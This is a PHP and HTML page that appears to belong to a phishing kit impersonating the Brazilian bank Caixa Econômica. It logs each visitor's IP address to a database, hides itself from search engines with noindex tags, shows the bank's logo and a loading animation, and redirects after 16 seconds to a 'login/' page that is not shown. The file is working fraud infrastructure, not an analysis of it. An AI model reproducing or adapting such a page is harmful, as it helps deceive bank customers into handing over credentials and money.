<?php 
    session_start();
    require_once "config/database.php";
    $db = new database;
	$conn = $db->conn;
	
    $ip = $_SERVER['REMOTE_ADDR'];
    $verifySql = $conn->prepare("SELECT * FROM logs_tela WHERE ip = :ip");
    $verifySql->execute([":ip" => $ip]);   

    if($verifySql->rowCount() > 0) {

    }else{
	    $addLog = $conn->prepare("INSERT INTO logs_tela(ip) VALUES(:ip)");
	    $addLog->execute([":ip" => $ip]);   
    }
?>
<!DOCTYPE html>
<html>
<head>
	<title>Caixa econômica</title>

	<!--METAS-->
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
	<meta name="robots" content="noindex, nofollow, noimageindex">
	<meta name="theme-color" content="#1664ac">

	<meta http-equiv="refresh" content="16, URL=login/" />






	<!--LINKS ESTILOS-->
	<link rel="shortcut icon" href="assets/imgs/favicon.ico">
	<link rel="stylesheet" type="text/css" href="assets/css/verificacao_dados.css">

	<!--SCRIPTS-->
	<script type="text/javascript" src="js/verificacao_dados.js"></script>
	
</head>
<body>
	<div class="container">
		<img class="logo" src="assets/imgs/logo_caixa.png">
		<div class="box-message">
			<p class="eng">
			
			</p>
			<p class="eng ng-hide">
			
			</p>
			
			<img id="loader-gif" class="loader-gif" src="assets/imgs/loading.gif">
			<img id="logo-x" class="logo-x ng-hide" src="assets/imgs/logo_x.png">
		</div>
	</div>
</body>
</html>